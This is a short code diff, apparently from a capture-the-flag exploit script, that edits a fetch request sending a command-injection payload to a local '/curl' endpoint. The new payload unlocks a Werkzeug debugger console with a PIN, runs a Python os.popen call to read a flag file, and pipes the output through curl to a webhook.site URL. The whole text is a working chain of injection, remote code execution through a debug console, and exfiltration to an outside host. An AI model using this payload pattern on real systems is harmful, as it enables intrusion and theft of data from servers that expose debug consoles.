@@ -13,8 +13,7 @@
         const res = await fetch("http://localhost:8001/curl", {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: "cmd=http://localhost:8001/console?__debugger__=yes&cmd=pinauth&pin=428-075-344&s=fpXORGH7hJFyNGlMLUqH | curl -X POST --data-binary @- https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/q= | curl -X POST --data-binary @/proc/self/fd/0 https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/p=`/flag`"
-
+            body: "cmd=localhost:8001/console?__debugger__=yes\&cmd=pinauth\&pin=428-075-344\&s=fpXORGH7hJFyNGlMLUqH  | curl http://localhost:8001/console?__debugger__=yes\&cmd=import+os%3Bos.popen%28%27.%2Fflag%27%29.read%28%29\&frm=0\&s=fpXORGH7hJFyNGlMLUqH | curl -X POST --data-binary @/proc/self/fd/0 https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/p=`/flag`"
 
             //STEP 1 /proc/net/arp
 
